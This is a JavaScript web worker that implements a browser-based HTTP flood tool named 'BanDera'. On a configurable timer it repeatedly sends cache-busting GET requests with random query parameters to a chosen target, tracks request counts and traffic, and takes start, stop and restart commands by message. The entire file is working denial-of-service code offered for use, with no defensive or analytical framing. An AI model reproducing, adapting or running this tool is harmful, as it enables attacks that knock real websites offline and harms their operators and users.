class BanDera {

    state = {
        requests: {
            total: 0,
            success: 0,
            failed: 0,
            strike: 0
        },
        timer: {
            job: null,
            ui: null
        },
        traffic: 0,
    }

    target = null;
    interval = 200;

    constructor(target, interval = 200) {
        this.target = target;
        this.interval = interval;
    }

    // set interval(value) {
    //     if (value < 10) return;
    //     console.log('setter works');
    //     this.interval = value;
    //     this.restart();
    // }

    start() {
        if (!this.isRunning()) {
            // Start job
            this.state.timer.job = setInterval(() => {
                this.makeRequest();
            }, this.interval);

            // Start UI refreshing
            this.state.timer.ui = setInterval(() => {
                let rate = (this.state.requests.failed / this.state.requests.total) * 100 || 0;
                postMessage({ ...this.state.requests, traffic: this.state.traffic, rate });
            }, 1000);
        }
    }

    stop() {
        if (this.isRunning()) {
            clearInterval(this.state.timer.job);
            this.state.timer.job = null;
            clearInterval(this.state.timer.ui);
            this.state.timer.ui = null;
        }
    }

    restart() {
        this.stop();
        this.start();
    }

    isRunning() {
        return this.state.timer.job && this.state.timer.ui;
    }

    makeRequest() {
        const requestUrl = `http${this.target.secure ? 's': ''}://${this.target.url + this.getRandomParam()}`;
        this.state.traffic += new TextEncoder().encode(requestUrl).length;
        fetch(requestUrl, {
            method: 'GET',
            mode: 'no-cors',
            cache: 'no-cache',
            referrerPolicy: "no-referrer",
            expires: 0
        }).catch(
            (error) => {
                if (error.code === 20) {
                    return;
                }
                this.failedRequest();
            }
        ).then(
            (response) => {
                if (response && !response.ok) {
                    this.successRequest();
                    return;
                }
                this.failedRequest();
            }
        );
    }

    successRequest() {
        this.state.requests.total++;
        this.state.requests.success++;
        this.state.requests.strike = 0;
    }

    failedRequest() {
        this.state.requests.total++;
        this.state.requests.failed++;
        this.state.requests.strike++;
    }

    getRandomParam() {
        return '?' + this.getRandomString() + '=' + this.getRandomString();
    }

    getRandomString(minLen = 3, maxLen = 25) {
        const chars = 'abcdefghijklmnopqrstuvwxyz';
        const len = Math.floor(Math.random() * (maxLen - minLen + 1)) + minLen;

        let str = '';
        for (let i = 0; i < len; i++) {
            str += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return str;
    }

}

let config = {
    target: null,
    interval: 200,
    action: null
}

let bandera = null;

onmessage = function (event) {
    config = {...config, ...event.data };

    if (!bandera && !config.target) return;

    bandera ??= new BanDera(config.target, config.interval);

    if (config.target) {
        bandera.target = config.target;
    }

    if (config.interval) {
        bandera.interval = config.interval;
    }

    switch (config.action) {
        case 'start':
            bandera.start();
            break;
        case 'stop':
            bandera.stop();
            break;
        case 'restart':
            bandera.restart();
            break;
        default:
            return;
    }
}
